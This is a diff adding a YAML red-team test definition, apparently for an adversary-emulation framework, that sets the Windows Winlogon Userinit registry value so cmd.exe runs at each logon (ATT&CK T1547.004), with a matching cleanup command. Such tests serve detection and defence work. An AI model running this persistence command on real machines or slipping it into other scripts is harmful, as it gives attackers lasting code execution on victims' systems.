@@ -1,0 +1,17 @@
+- id: 0789ab56-eefd-5929-9db1-cae1c8017c14
+  name: Soumaia ART Tests - Winlogon Userinit Key Persistence - PowerShell
+  description: 'PowerShell code to set Winlogon userinit key to execute a binary at logon along with userinit.exe.
+
+
+    Upon successful execution, PowerShell will modify a registry value to execute cmd.exe upon logon/logoff.'
+  tactic: privilege-escalation
+  technique:
+    attack_id: T1547.004
+    name: 'Boot or Logon Autostart Execution: Winlogon Helper DLL'
+  platforms:
+    windows:
+      psh:
+        command: |-
+          Set-ItemProperty "HKCU:\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\" "Userinit" "Userinit.exe, C:\Windows\System32\cmd.exe" -Force
+        cleanup: |-
+          Remove-ItemProperty -Path "HKCU:\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\" -Name "Userinit" -Force -ErrorAction Ignore
